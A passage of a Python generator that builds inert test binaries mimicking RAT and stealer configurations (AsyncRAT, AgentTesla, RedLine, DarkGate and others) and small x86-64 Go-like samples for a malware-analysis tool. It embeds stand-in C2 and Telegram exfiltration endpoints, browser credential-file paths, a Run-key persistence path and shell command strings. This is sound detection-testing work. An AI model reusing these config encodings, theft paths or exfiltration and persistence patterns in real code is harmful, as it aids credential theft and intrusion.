                 rcdata=[("SETTINGS", bytes([len(key)]) + key + rc4(key, cfg))])


def _rat_encrypt(master: bytes, salt: bytes, value: str) -> str:
    import hashlib
    import hmac

    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    k = hashlib.pbkdf2_hmac("sha1", master, salt, 50000, 96)
    iv = hashlib.sha256(master + value.encode()).digest()[:16]       # deterministic samples
    p = padding.PKCS7(128).padder()
    data = p.update(value.encode()) + p.finalize()
    e = Cipher(algorithms.AES(k[:32]), modes.CBC(iv)).encryptor()
    body = iv + e.update(data) + e.finalize()
    return base64.b64encode(hmac.new(k[32:], body, hashlib.sha256).digest() + body).decode()


QUASAR_SALT = bytes.fromhex("bfeb1e56fbcd973bb219022430a57843003d5644d21e62b9d4f180e7e6c33941")


def asyncrat_exe() -> bytes:
    import binkit as bk

    master = b"qD8vH2kLmP4sT7wXzA1cE5gJ9nR3uY6b"
    enc = lambda v: _rat_encrypt(master, QUASAR_SALT, v)
    settings = [enc("6606,7707,8808"), enc("cdn-update.example.net," + C2_IP), enc("0.5.8"),
                enc("false"), enc("%AppData%"), enc("AsyncMutex_6SI8OkPnk"), enc("Factura-2026"),
                base64.b64encode(master).decode()]
    return bk.pe(bits=32, gui=True, dotnet={
        "assembly": "AsyncClient", "strings": ["Client.Settings", "Aes256", "Rfc2898DeriveBytes", "Pastebin"],
        "user_strings": settings})


def quasar_exe() -> bytes:
    import binkit as bk

    master = "1WvgEMPjdwfqIMeM9MclyQ"
    enc = lambda v: _rat_encrypt(master.encode(), QUASAR_SALT, v)
    settings = [enc("1.4.1"), enc(f"cdn-update.example.net:4782;{C2_IP}:4782;"), enc("Office04"),
                enc("SubDir"), enc("Client.exe"), enc("QSR_MUTEX_k3Hd9xA1Lm"), enc("Quasar Client Startup"),
                master]
    return bk.pe(bits=32, gui=True, dotnet={
        "assembly": "Quasar.Client", "strings": ["Quasar.Common", "Aes256", "Rfc2898DeriveBytes"],
        "user_strings": settings})


def njrat_exe() -> bytes:
    import binkit as bk

    return bk.pe(bits=32, gui=True, dotnet={
        "assembly": "Stub", "strings": ["OK", "kl", "Program"],
        "user_strings": ["Server.exe", "TEMP", "cdn-update.example.net", "5552",
                         base64.b64encode(b"Factura_2026").decode(), "0.7d", "|'|'|",
                         "5cd8f17f4086744065eb0992a09e05a2", "SEE_MASK_NOZONECHECKS",
                         "netsh firewall add allowedprogram \"", "cmd.exe /c ping 0 -n 2 & del \""]})


def xworm_exe() -> bytes:
    import hashlib

    import binkit as bk
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    mutex = "Kz3FvP9qLmX2bWsA"
    h = hashlib.md5(mutex.encode()).digest()
    key = h[:15] + h + b"\x00"

    def enc(v: str) -> str:
        p = padding.PKCS7(128).padder()
        e = Cipher(algorithms.AES(key), modes.ECB()).encryptor()
        return base64.b64encode(e.update(p.update(v.encode()) + p.finalize()) + e.finalize()).decode()
    return bk.pe(bits=32, gui=True, dotnet={
        "assembly": "XClient", "strings": ["XWorm", "Settings", "AlgorithmAES"],
        "user_strings": [enc("cdn-update.example.net," + C2_IP), enc("7000"), enc("<123456789>"),
                         enc("<Xwormmm>"), enc("XWorm V5.6"), enc("USB.exe"), mutex]})


def agenttesla_exe() -> bytes:
    import binkit as bk

    return bk.pe(bits=32, gui=True, dotnet={
        "assembly": "FacturaPDF", "strings": ["SmtpClient", "NetworkCredential", "MailMessage", "Send"],
        "user_strings": ["\\Google\\Chrome\\User Data\\Default\\Login Data", "\\Mozilla\\Firefox\\Profiles",
                         "logins.json", "\\Thunderbird\\Profiles", "\\FileZilla\\recentservers.xml",
                         "mail.billing-portal.example", "587", "facturas.envio@billing-portal.example",
                         "recepcion.logs@mail-box.example.org",
                         "https://api.telegram-relay.example/bot7012345678:AAH9xQe3T_kz8v0Lm2PqR5sY1uW4bC6dE7f/sendDocument",
                         "-1002026018700"]})


def nanocore_exe() -> bytes:
    import binkit as bk

    return bk.pe(bits=32, gui=True, dotnet={
        "assembly": "NanoCore Client", "strings": ["NanoCore.ClientPluginHost", "IClientNetworkHost", "ClientLoaderForm"],
        "user_strings": ["ClientPlugin"], "resource": bk.noise(0x800, 211)})


def _rc4(key: bytes, data: bytes) -> bytes:
    st, j, out = list(range(256)), 0, bytearray()
    for i in range(256):
        j = (j + st[i] + key[i % len(key)]) & 0xFF
        st[i], st[j] = st[j], st[i]
    i = j = 0
    for c in data:
        i = (i + 1) & 0xFF
        j = (j + st[i]) & 0xFF
        st[i], st[j] = st[j], st[i]
        out.append(c ^ st[(st[i] + st[j]) & 0xFF])
    return bytes(out)


def redline_exe() -> bytes:
    import binkit as bk

    key = "Ombudsman"

    def enc(v: str) -> str:
        inner = base64.b64encode(v.encode()).decode()
        x = "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(inner))
        return base64.b64encode(x.encode()).decode()
    return bk.pe(bits=32, gui=True, dotnet={
        "assembly": "EntryPoint", "strings": ["RedLine.Logic", "StringDecrypt", "Arguments"],
        "user_strings": [enc(f"cdn-update.example.net:7712|{C2_IP}:7712"), enc("Factura_2026"), "", key]})


def snake_exe() -> bytes:
    import hashlib

    import binkit as bk
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.primitives.ciphers import Cipher, modes
    try:
        from cryptography.hazmat.decrepit.ciphers.algorithms import TripleDES
    except ImportError:
        from cryptography.hazmat.primitives.ciphers.algorithms import TripleDES

    key = "BsrOkyiChvpfhAkipZAxnnChkMGkLnAiZhGMyrnJfULiDGkfTkrTELinhfk"
    k8 = hashlib.md5(key.encode()).digest()[:8]

    def enc(v: str) -> str:
        p = padding.PKCS7(64).padder()
        e = Cipher(TripleDES(k8 * 3), modes.ECB()).encryptor()
        return base64.b64encode(e.update(p.update(v.encode()) + p.finalize()) + e.finalize()).decode()
    return bk.pe(bits=32, gui=True, dotnet={
        "assembly": "FacturaVisor", "strings": ["SmtpClient", "DESCryptoServiceProvider", "MD5CryptoServiceProvider"],
        "user_strings": [enc("facturas.envio@billing-portal.example"), enc("Fct#2026pass"),
                         enc("mail.billing-portal.example"), enc("recepcion.logs@mail-box.example.org"),
                         enc("587"), enc("-------- Snake Keylogger --------"), key]})


def raccoon_exe() -> bytes:
    import binkit as bk

    key = "edinayarossiya2026"

    def enc(v: str) -> str:
        return base64.b64encode(_rc4(key.encode(), v.encode())).decode()
    return bk.pe(bits=32, gui=True, imports={"kernel32.dll": ["LoadLibraryW", "GetProcAddress", "Sleep"],
                                             "wininet.dll": ["InternetOpenW", "HttpSendRequestW"]},
                 strings=[key, enc(f"http://{C2_IP}/"), enc("machineId="), enc("|"), enc("&configId="),
                          enc("record"), enc("Content-Type: application/x-www-form-urlencoded")])


def warzone_exe() -> bytes:
    import struct as _st

    import binkit as bk

    key = bytes.fromhex("6e5a1f3c9b27d4e8a0c3f1b2d5e7a9c4f0e1d2c3b4a59687")
    host = "cdn-update.example.net".encode("utf-16-le")
    cfg = _st.pack("<I", len(host)) + host + _st.pack("<H", 5200) + b"\x00" * 40
    bss = _st.pack("<I", len(key)) + key + _rc4(key, cfg)
    return bk.pe(bits=32, gui=True, imports={"kernel32.dll": ["VirtualAlloc", "Sleep"], "ws2_32.dll": ["connect"]},
                 strings=["Ave_Maria Stealer OpenSource github Link", "warzone160"],
                 sections=[(".bss", bss.ljust(0x200, b"\x00"), 0xC0000040)])


def darkgate_blob() -> bytes:
    import random as _r

    std = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    alpha = "".join(_r.Random(2026).sample(std, 64))
    table = str.maketrans(std, alpha)

    def enc(v: str) -> str:
        return base64.b64encode(v.encode()).decode().rstrip("=").translate(table)
    cfg = "0=http://cdn-update.example.net:2351\r\n1=Yes\r\n8=No\r\n15=Factura2026\r\n"
    return (C2_STUB + b"\n[inert DarkGate-style settings, AutoIt payload stand-in]\n"
            + alpha.encode() + b"\x00" + enc(cfg).encode() + b"\x00" + enc(f"http://{C2_IP}:2351").encode() + b"\x00")


# --- Go Malware Intelligence: Go-like binaries --------------------------------------
# Inert binkit stubs (code = ``ret``) carrying the Go structures the identification
# reads, in the real layouts: BuildInfo (inline strings, Go 1.18+), pclntab
# (magic 0xfffffff1, Go 1.20+) with its function-name table, moduledata pointing
# back at it and the Go build ID. Variants: stripped, damaged BuildInfo, Garble-style.

GO_STD = ["runtime.main", "runtime.goexit", "runtime.gopanic", "runtime.morestack", "runtime.mallocgc",
          "runtime.newproc", "runtime.schedule", "runtime.mstart", "sync.(*Mutex).Lock", "fmt.Println",
          "os.Getenv", "net/http.(*Client).Do", "crypto/aes.NewCipher", "encoding/base64.(*Encoding).DecodeString"]
GO_USER = ["main.main", "main.(*Config).load", "main.beacon", "main.decryptConfig", "main.persist",
           "example.com/invoicesync/agent.(*Agent).Run", "example.com/invoicesync/agent.sendResults"]
GO_MODINFO = ("path\texample.com/invoicesync\nmod\texample.com/invoicesync\t(devel)\t\n"
              "dep\tgithub.com/kbinani/screenshot\tv0.0.0-20230812210009-b87d31814237\th1:oghJbYN7QQkTBsYbkrVgcJ7gUlbkfwdhV9GjaJ5awXo=\n"
              "dep\tgolang.org/x/sys\tv0.21.0\th1:rF+pYz3DAGSQAxAu1CbC7catZg4ebC4UIeIhKxBZvws=\n"
              "build\t-buildmode=exe\nbuild\t-compiler=gc\nbuild\t-ldflags=\"-s -w -H=windowsgui\"\n"
              "build\tCGO_ENABLED=0\nbuild\tGOARCH=amd64\nbuild\tGOOS={goos}\n")


def _go_pclntab(names: list[str]) -> bytes:
    import struct as _st

    blob = b"".join(n.encode() + b"\x00" for n in names)
    hdr = 8 + 8 * 8
    fname = hdr
    cu = fname + len(blob)
    ftab = cu + 16
    pctab = ftab + 32
    pcln = pctab + 32
    head = _st.pack("<IBBBB", 0xFFFFFFF1, 0, 0, 1, 8) + _st.pack("<8Q", len(names), 3, 0x401000, fname, cu, ftab, pctab, pcln)
    return head + blob + b"\x00" * (pcln - cu + 64)


def _go_buildinfo(version: str, goos: str) -> bytes:
    def uv(n: int) -> bytes:
        out = bytearray()
        while True:
            b = n & 0x7F
            n >>= 7
            out.append(b | (0x80 if n else 0))
            if not n:
                return bytes(out)
    mod = (bytes.fromhex("3077af0c9274080241e1c107e6d618e6") + GO_MODINFO.format(goos=goos).encode()
           + bytes.fromhex("f932433186182072008242104116d8f2"))
    head = b"\xff Go buildinf:" + bytes([8, 2]) + b"\x00" * 16
    return head + uv(len(version)) + version.encode() + uv(len(mod)) + mod


def _go_elf(names: list[str], version: str = "go1.22.5", stripped: bool = True) -> bytes:
    import struct as _st

    import binkit as bk
    sys.path.insert(0, str(ROOT))
    from docutracex.golang import binfmt

    bid = "Ab3dE5fG7hI9jK1lM2nO/pQ4rS6tU8vW0xY2zA4bC/dE6fG8hI0jK2lM4nO6p/qR8sT0uV2wX4yZ6aB8cD"
    note = _st.pack("<III", 4, len(bid) + 1, 4) + b"Go\x00\x00" + bid.encode() + b"\x00"
    pcln = _go_pclntab(names)

    def build(md: bytes) -> bytes:
        extra = [(".note.go.buildid", note), (".gopclntab", pcln), (".go.buildinfo", _go_buildinfo(version, "linux")),
                 (".noptrdata", md)]
        if not stripped:
            extra += [(".debug_info", b"\x00" * 32), (".symtab", b"\x00" * 48)]
        return bk.elf(strings=["invoice sync agent"], extra=extra)
    first = build(b"\x00" * 32)
    sec = binfmt.parse(first).section(".gopclntab")
    va = sec.va if sec and sec.va else 0
    return build(_st.pack("<4Q", va, va + 72, len(names), len(names)))


def _go_pe(names: list[str], version: str = "go1.22.5") -> bytes:
    import struct as _st

    import binkit as bk
    sys.path.insert(0, str(ROOT))
    from docutracex.golang import binfmt

    bid = b'\xff Go build ID: "Zq9xWv8uTs7rQp6oNm5l/Kj4iHg3fEd2cBa1zYx0w/Vu9tSr8qPo7nMl6kJi5h/Gf4eDc3bAa2zZy1xW"\n \xff'
    pcln = _go_pclntab(names)

    def build(md: bytes) -> bytes:
        return bk.pe(bits=64, gui=True, imports={"kernel32.dll": ["VirtualAlloc", "ExitProcess"]},
                     sections=[(".rdata", pcln, 0x40000040), (".data", _go_buildinfo(version, "windows") + md, 0xC0000040)],
                     strings=[bid.decode("latin-1")])
    first = build(b"\x00" * 32)
    data = first
    off = data.find(_st.pack("<I", 0xFFFFFFF1) + b"\x00\x00")
    va = binfmt.parse(data).off_to_va(off) or 0
    return build(_st.pack("<4Q", va, va + 72, len(names), len(names)))


# --- Code analysis (Rizin + rz-ghidra): binaries with a few real x86-64 functions --------
# Tiny, hand-encoded and never run: a main that XOR-decodes a buffer in place and
# hands the invoice C2 URL to an HTTP call (an import for the native PE, a Go
# function for the Go one). Enough for the engine to find functions, callers /
# callees, the URL string, the XOR loop and pseudocode. Nothing else in them.

CODE_URL = "https://cdn-update.example.net/invoice/sync"
CODE_XOR_KEY = 0xA5
CODE_SECRET = b"sleep=60;jitter=15;id=INV-0413;x"              # 32 bytes, XOR-encoded in the samples
CODE_BLOB = bytes(b ^ CODE_XOR_KEY for b in CODE_SECRET).decode("latin-1")
# AES-256-GCM sealed config (fixed key / nonce so the sample is reproducible)
CODE_GCM_KEY = bytes.fromhex("8f3a1c5e7b2d904e6a1f3c8b5d2e7a91c4f60b3e8d1a5c7f2e9b4d6a0c3f8e1b")
CODE_GCM_NONCE = bytes.fromhex("5ac1e3f7092b4d6e8f1a3c5e")
CODE_CONFIG = b'{"c2": "https://cdn-update.example.net/invoice/sync", "backup": "203.0.113.47:8443", "id": "INV-2026-0413"}'


CODE_GARBLE_SECRET = b"C:\\ProgramData\\InvoiceSync\\agent.exe"
CODE_GARBLE_SEED, CODE_GARBLE_STEP = 0x5C, 0x2B


def _garble_literal() -> list:
    """x86-64 for a closure like Garble's -literals output: the encoded bytes are
    stored on the stack, decoded in place with a key that changes every byte,
    and the buffer is handed to runtime.slicebytetostring (rbx = ptr, rcx = len)."""
    import struct as _st
    secret, n = CODE_GARBLE_SECRET, len(CODE_GARBLE_SECRET)
    assert n < 0x60
    enc, k = bytearray(), CODE_GARBLE_SEED
    for b in secret:
        enc.append(b ^ k)
        k = (k + CODE_GARBLE_STEP) & 0xFF
    code = bytearray(b"\x48\x83\xec\x68")                                 # sub rsp, 0x68
    for i, b in enumerate(enc):
        code += bytes([0xC6, 0x44, 0x24, i, b])                              # mov byte [rsp+i], enc[i]
    code += b"\x31\xc0" + bytes([0xB2, CODE_GARBLE_SEED])                    # xor eax,eax ; mov dl, seed
    code += b"\x30\x14\x04" + bytes([0x80, 0xC2, CODE_GARBLE_STEP])           # loop: xor [rsp+rax],dl ; add dl, step
    code += b"\x48\xff\xc0\x48\x83\xf8" + bytes([n]) + b"\x72\xf1"          # inc rax ; cmp rax, n ; jb loop
    code += b"\x48\x89\xe3\xb9" + _st.pack("<I", n) + b"\x31\xc0"            # mov rbx,rsp ; mov ecx,n ; xor eax,eax
    return [bytes(code)]


def _sealed() -> bytes:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    return AESGCM(CODE_GCM_KEY).encrypt(CODE_GCM_NONCE, CODE_CONFIG, None)


CODE_SEALED = _sealed()
CODE_RUN_KEY = b"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
CODE_CMDLINE = b"cmd.exe /c whoami /all"


def _aes_sbox() -> bytes:
    """The AES S-box (as crypto/aes carries it), computed: inverse in GF(2^8) + affine map."""
    def mul(a: int, b: int) -> int:
        r = 0
        while b:
            if b & 1:
                r ^= a
            a = ((a << 1) ^ (0x11B if a & 0x80 else 0)) & 0xFF
            b >>= 1
        return r
    inv = [0] * 256
    for a in range(1, 256):
        for b in range(1, 256):
            if mul(a, b) == 1:
                inv[a] = b
                break
    out = bytearray()
    for x in range(256):
        b = inv[x]
        out.append(b ^ ((b << 1 | b >> 7) & 0xFF) ^ ((b << 2 | b >> 6) & 0xFF) ^ ((b << 3 | b >> 5) & 0xFF)
                   ^ ((b << 4 | b >> 4) & 0xFF) ^ 0x63)
    return bytes(out)


def _sha256_k() -> bytes:
    import math
    import struct as _st

    def primes(n: int) -> list[int]:
        out, c = [], 2
        while len(out) < n:
            if all(c % p for p in out):
                out.append(c)
            c += 1
        return out
    return _st.pack("<64I", *(int((p ** (1 / 3) % 1) * (1 << 32)) & 0xFFFFFFFF for p in primes(64)))


def _x64(ops: list) -> tuple[bytes, dict[str, int]]:
    """Tiny assembler: items are bytes, ("label", name) or (kind, target, raw) where
    kind is "rel32" (call/jmp rel32 to a label) or "rip" (disp32 to an absolute RVA
    given in ``target``, relative to the end of the instruction of length raw+4)."""
    out, labels, fix = bytearray(), {}, []
    for op in ops:
        if isinstance(op, (bytes, bytearray)):
            out += op
        elif op[0] == "label":
            labels[op[1]] = len(out)
        else:
            out += op[2]
            fix.append((len(out), op[0], op[1]))
            out += b"\x00\x00\x00\x00"
    return bytes(out), {"_fix": fix, **labels}  # type: ignore[dict-item]


def _x64_link(code: bytes, meta: dict, text_rva: int, rvas: dict[str, int]) -> bytes:
    import struct as _st
    out = bytearray(code)
    for pos, kind, target in meta["_fix"]:
        dest = text_rva + meta[target] if kind in ("rel32", "riplabel") else rvas[target]
        _st.pack_into("<i", out, pos, dest - (text_rva + pos + 4))
    return bytes(out)


def _code_body(http_call: list) -> list:
    return [
        ("label", "main"),
        b"\x48\x83\xec\x28",                                    # sub rsp, 0x28
        ("rip", "blob", b"\x48\x8d\x0d"),                          # lea rcx, [rip+blob]
        ("rel32", "decode", b"\xe8"),                              # call decode
        ("rel32", "beacon", b"\xe8"),                              # call beacon
        b"\x48\x83\xc4\x28\xc3",                                # add rsp, 0x28 ; ret
        b"\xcc" * 3,
        ("label", "decode"),
        b"\x31\xc0",                                              # xor eax, eax
        ("label", "dloop"),
        b"\x8a\x14\x01\x80\xf2" + bytes([CODE_XOR_KEY]) + b"\x88\x14\x01",   # mov dl,[rcx+rax]; xor dl,KEY; mov [rcx+rax],dl
        b"\x0f\x1f\x40\x00",                                      # nop
        b"\x48\xff\xc0\x48\x83\xf8\x20\x72\xea",                 # inc rax; cmp rax,0x20; jb dloop
        b"\x48\x89\xc8\xc3",                                      # mov rax, rcx ; ret
        b"\xcc" * 2,
        ("label", "beacon"),
        b"\x48\x83\xec\x28",                                    # sub rsp, 0x28
        *http_call,
        b"\x48\x83\xc4\x28\xc3",
        b"\xcc" * 3,
    ]


def code_loader_exe() -> bytes:
    """Native PE32+: main → decode (XOR loop) → beacon → InternetOpenUrlA(C2 URL)."""
    import binkit as bk
    sys.path.insert(0, str(ROOT))
    from docutracex.golang import binfmt
    imports = {"wininet.dll": ["InternetOpenA", "InternetOpenUrlA", "InternetReadFile"],
               "kernel32.dll": ["VirtualAlloc", "ExitProcess"]}
    http = [b"\x31\xc9\x31\xd2\x45\x31\xc0\x45\x31\xc9",          # xor ecx,ecx; xor edx,edx; xor r8d,r8d; xor r9d,r9d
            ("rip", "InternetOpenA", b"\xff\x15"),                # call [InternetOpenA]
            b"\x48\x89\xc1",                                      # mov rcx, rax
            ("rip", "url", b"\x48\x8d\x15"),                       # lea rdx, [rip+url]
            b"\x45\x31\xc0\x45\x31\xc9",
            ("rip", "InternetOpenUrlA", b"\xff\x15")]             # call [InternetOpenUrlA]
    code, meta = _x64(_code_body(http))
    blob = CODE_BLOB

    def build(c: bytes) -> bytes:
        return bk.pe(bits=64, gui=False, imports=imports, code=c, strings=[CODE_URL, blob, "invoice sync"])
    first = build(code)
    import pefile
    pe = pefile.PE(data=first)
    rvas = {i.name.decode(): i.address - pe.OPTIONAL_HEADER.ImageBase for d in pe.DIRECTORY_ENTRY_IMPORT for i in d.imports}
    bf = binfmt.parse(first)
    rvas["url"] = bf.off_to_va(first.find(CODE_URL.encode())) - pe.OPTIONAL_HEADER.ImageBase
    rvas["blob"] = bf.off_to_va(first.find(blob.encode("latin-1"))) - pe.OPTIONAL_HEADER.ImageBase
    text = next(sec for sec in pe.sections if sec.Name.rstrip(b"\x00") == b".text").VirtualAddress
    return build(_x64_link(code, meta, text, rvas))


def _go_pclntab_funcs(funcs: list[tuple[str, int, int]], extra: list[str], text_start: int) -> bytes:
    """Go 1.20+ pclntab whose functab really maps ``funcs`` [(name, text offset, size)]."""
    import struct as _st
    names = [f[0] for f in funcs] + extra
    blob, offs = bytearray(), {}
    for n in names:
        offs[n] = len(blob)
        blob += n.encode() + b"\x00"
    hdr = 8 + 8 * 8
    fname = hdr
    cu = fname + len(blob)
    filetab = cu + 16
    pctab = filetab + 16
    pcln = pctab + 16                                                 # the functab
    nf = len(funcs)
    tab = bytearray()
    func_base = 8 * (nf + 1)
    for k, (_n, eoff, _sz) in enumerate(funcs):
        tab += _st.pack("<II", eoff, func_base + 16 * k)
    last = funcs[-1]
    tab += _st.pack("<II", last[1] + last[2], 0)
    for n, eoff, _sz in funcs:
        tab += _st.pack("<Ii8x", eoff, offs[n])
    head = _st.pack("<IBBBB", 0xFFFFFFF1, 0, 0, 1, 8) + _st.pack("<8Q", nf, 1, text_start, fname, cu, filetab, pctab, pcln)
    return head + bytes(blob) + b"\x00" * 48 + bytes(tab) + b"\x00" * 32


def go_code_exe() -> bytes:
    """Go-like PE32+ with real functions in pclntab: main.main → main.decryptConfig
    (XOR loop), then ``go func(){ beacon() }()`` (closure main.main.func1 handed
    to runtime.newproc) and a deferred call; main.beacon → net/http.(*Client).Do
    (C2 URL as Go string)."""
    import struct as _st

    import binkit as bk
    sys.path.insert(0, str(ROOT))
    from docutracex.golang import binfmt
    http = [("rip", "url", b"\x48\x8d\x05"),                       # lea rax, [rip+url]
            b"\xbb" + _st.pack("<I", len(CODE_URL)),                 # mov ebx, len  (Go string: ptr + len)
            ("rel32", "httpdo", b"\xe8")]                           # call net/http.(*Client).Do
    body = [
        ("label", "main"),
        b"\x48\x83\xec\x28",                                    # sub rsp, 0x28
        ("rip", "blob", b"\x48\x8d\x0d"),                          # lea rcx, [rip+blob]
        ("rel32", "decode", b"\xe8"),                              # call main.decryptConfig
        ("riplabel", "func1", b"\x48\x8d\x05"),                    # lea rax, [main.main.func1]
        ("rel32", "newproc", b"\xe8"),                             # call runtime.newproc   (go func1())
        ("rel32", "deferreturn", b"\xe8"),                         # call runtime.deferreturn
        b"\x48\x83\xc4\x28\xc3",                                # add rsp, 0x28 ; ret
        b"\xcc" * 3,
        *_code_body([])[7:14],                                     # decode: the XOR loop
        ("label", "beacon"),
        b"\x48\x83\xec\x28", *http, b"\x48\x83\xc4\x28\xc3", b"\xcc" * 3,
        ("label", "func1"),
        b"\x48\x83\xec\x28", ("rel32", "beacon", b"\xe8"), b"\x48\x83\xc4\x28\xc3", b"\xcc" * 3,
        ("label", "httpdo"), b"\xc3", b"\xcc" * 15,
        ("label", "newproc"), b"\xc3", b"\xcc" * 15,
        ("label", "deferreturn"), b"\xc3", b"\xcc" * 15,
        ("label", "cfgload"), b"\xc3", b"\xcc" * 15,          # method main.(*Config).load (Types tab)
        # main.openConfig: aes.NewCipher(key[:32]) → cipher.NewGCM → gcm.Open(nonce[:12], sealed)
        ("label", "openconfig"),
        b"\x48\x83\xec\x28",
        ("rip", "gcmkey", b"\x48\x8d\x05"), b"\xbb" + _st.pack("<I", 32),        # lea rax,[key]; mov ebx,32
        ("rel32", "newcipher", b"\xe8"),                                        # call crypto/aes.NewCipher
        ("rel32", "newgcm", b"\xe8"),                                           # call crypto/cipher.NewGCM
        ("rip", "gcmnonce", b"\x48\x8d\x05"), b"\xbb" + _st.pack("<I", 12),      # lea rax,[nonce]; mov ebx,12
        ("rip", "sealed", b"\x48\x8d\x0d"), b"\xbf" + _st.pack("<I", len(CODE_SEALED)),  # lea rcx,[ct]; mov edi,len
        ("rel32", "gcmopen", b"\xe8"),                                          # call crypto/cipher.(*gcm).Open
        b"\x48\x83\xc4\x28\xc3", b"\xcc" * 3,
        # main.persist: registry.OpenKey(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`) → SetStringValue
        ("label", "persist"),
        b"\x48\x83\xec\x28",
        ("rip", "runkey", b"\x48\x8d\x05"), b"\xbb" + _st.pack("<I", len(CODE_RUN_KEY)),
        ("rel32", "openkey", b"\xe8"), ("rel32", "setvalue", b"\xe8"),
        b"\x48\x83\xc4\x28\xc3", b"\xcc" * 3,
        # main.runCmd: exec.Command("cmd.exe /c whoami") → (*Cmd).Output
        ("label", "runcmd"),
        b"\x48\x83\xec\x28",
        ("rip", "cmdline", b"\x48\x8d\x05"), b"\xbb" + _st.pack("<I", len(CODE_CMDLINE)),
        ("rel32", "execcmd", b"\xe8"), ("rel32", "cmdoutput", b"\xe8"),
        b"\x48\x83\xc4\x28\xc3", b"\xcc" * 3,
        # main.main.func2: a Garble-style literal closure (stack bytes + rolling key → slicebytetostring)
        ("label", "garblelit"), *_garble_literal(), ("rel32", "sbts", b"\xe8"), b"\x48\x83\xc4\x68\xc3", b"\xcc" * 3,
        # main.useConfig: a call through an interface (itab → fun[0] = main.(*Config).load)
        ("label", "useconfig"),
        b"\x48\x83\xec\x28", ("rip", "itab", b"\x48\x8d\x05"),           # lea rax, [go:itab.*main.Config,main.Loader]
        b"\x48\x8b\x48\x18\xff\xd1",                                    # mov rcx, [rax+0x18] ; call rcx
        b"\x48\x83\xc4\x28\xc3", b"\xcc" * 3,
        ("label", "sbts"), b"\xc3", b"\xcc" * 15,
        ("label", "openkey"), b"\xc3", b"\xcc" * 15,
        ("label", "setvalue"), b"\xc3", b"\xcc" * 15,
        ("label", "execcmd"), b"\xc3", b"\xcc" * 15,
        ("label", "cmdoutput"), b"\xc3", b"\xcc" * 15,
        ("label", "newcipher"), b"\xc3", b"\xcc" * 15,
        ("label", "newgcm"), b"\xc3", b"\xcc" * 15,
        ("label", "gcmopen"), b"\xc3", b"\xcc" * 15,
        ("label", "end")]
    code, meta = _x64(body)
    blob = CODE_BLOB
    bid = b'\xff Go build ID: "Zq9xWv8uTs7rQp6oNm5l/Kj4iHg3fEd2cBa1zYx0w/Vu9tSr8qPo7nMl6kJi5h/Gf4eDc3bAa2zZy1xW"\n \xff'
    funcs = [("main.main", meta["main"], meta["decode"] - meta["main"]),
             ("main.decryptConfig", meta["decode"], meta["beacon"] - meta["decode"]),
             ("main.beacon", meta["beacon"], meta["func1"] - meta["beacon"]),
             ("main.main.func1", meta["func1"], meta["httpdo"] - meta["func1"]),
             ("net/http.(*Client).Do", meta["httpdo"], meta["newproc"] - meta["httpdo"]),
             ("runtime.newproc", meta["newproc"], meta["deferreturn"] - meta["newproc"]),
             ("runtime.deferreturn", meta["deferreturn"], meta["cfgload"] - meta["deferreturn"]),
             ("main.(*Config).load", meta["cfgload"], meta["openconfig"] - meta["cfgload"]),
             ("main.openConfig", meta["openconfig"], meta["persist"] - meta["openconfig"]),
             ("main.persist", meta["persist"], meta["runcmd"] - meta["persist"]),
             ("main.runCmd", meta["runcmd"], meta["garblelit"] - meta["runcmd"]),
             ("main.main.func2", meta["garblelit"], meta["useconfig"] - meta["garblelit"]),
             ("main.useConfig", meta["useconfig"], meta["sbts"] - meta["useconfig"]),
             ("runtime.slicebytetostring", meta["sbts"], meta["openkey"] - meta["sbts"]),
             ("golang.org/x/sys/windows/registry.OpenKey", meta["openkey"], meta["setvalue"] - meta["openkey"]),
             ("golang.org/x/sys/windows/registry.Key.SetStringValue", meta["setvalue"], meta["execcmd"] - meta["setvalue"]),
             ("os/exec.Command", meta["execcmd"], meta["cmdoutput"] - meta["execcmd"]),
             ("os/exec.(*Cmd).Output", meta["cmdoutput"], meta["newcipher"] - meta["cmdoutput"]),
             ("crypto/aes.NewCipher", meta["newcipher"], meta["newgcm"] - meta["newcipher"]),
             ("crypto/cipher.NewGCM", meta["newgcm"], meta["gcmopen"] - meta["newgcm"]),
             ("crypto/cipher.(*gcm).Open", meta["gcmopen"], meta["end"] - meta["gcmopen"])]
    extra = [n for n in GO_STD if n not in ("net/http.(*Client).Do", "runtime.newproc")]
    base = 0x140000000                                              # binkit PE32+ image base, .text at RVA 0x1000
    text_va = base + 0x1000
    pcln = _go_pclntab_funcs(funcs, extra, text_va)

    def build(c: bytes, md: bytes, emb: bytes, itab: bytes = b"\x00" * 32) -> bytes:
        # the URL is a Go string: bytes with no NUL, referenced by pointer + length
        return bk.pe(bits=64, gui=False, imports={"kernel32.dll": ["VirtualAlloc", "ExitProcess"]}, code=c,
                     sections=[(".rdata", pcln + CODE_URL.encode() + blob.encode("latin-1") + b"\x00" * 8
                                + CODE_GCM_KEY + CODE_GCM_NONCE + CODE_SEALED + CODE_RUN_KEY + CODE_CMDLINE + b"ITAB" + itab
                                + _aes_sbox() + _sha256_k(), 0x40000040),
                               (".data", _go_buildinfo("go1.22.5", "windows") + md, 0xC0000040),
                               (".embed", emb, 0x40000040)],
                     strings=[bid.decode("latin-1")])
    first = build(code, b"\x00" * 32, _go_embed_section(0))
    bf = binfmt.parse(first)
    assert bf.section(".text").va == text_va
    rvas = {"url": bf.off_to_va(first.find(CODE_URL.encode())) - base,
            "blob": bf.off_to_va(first.find(blob.encode("latin-1"))) - base}
    for k, v in (("gcmkey", CODE_GCM_KEY), ("gcmnonce", CODE_GCM_NONCE), ("sealed", CODE_SEALED),
                 ("runkey", CODE_RUN_KEY), ("cmdline", CODE_CMDLINE)):
        rvas[k] = bf.off_to_va(first.find(v)) - base
    rvas["itab"] = bf.off_to_va(first.find(b"ITAB" + b"\x00" * 32) + 4) - base
    itab = _st.pack("<QQII", base + rvas["runkey"], base + rvas["cmdline"], 0x5CA1AB1E, 0) + \
        _st.pack("<Q", text_va + meta["cfgload"])               # {inter, _type, hash, _, fun[0]}
    linked = _x64_link(code, meta, text_va - base, rvas)
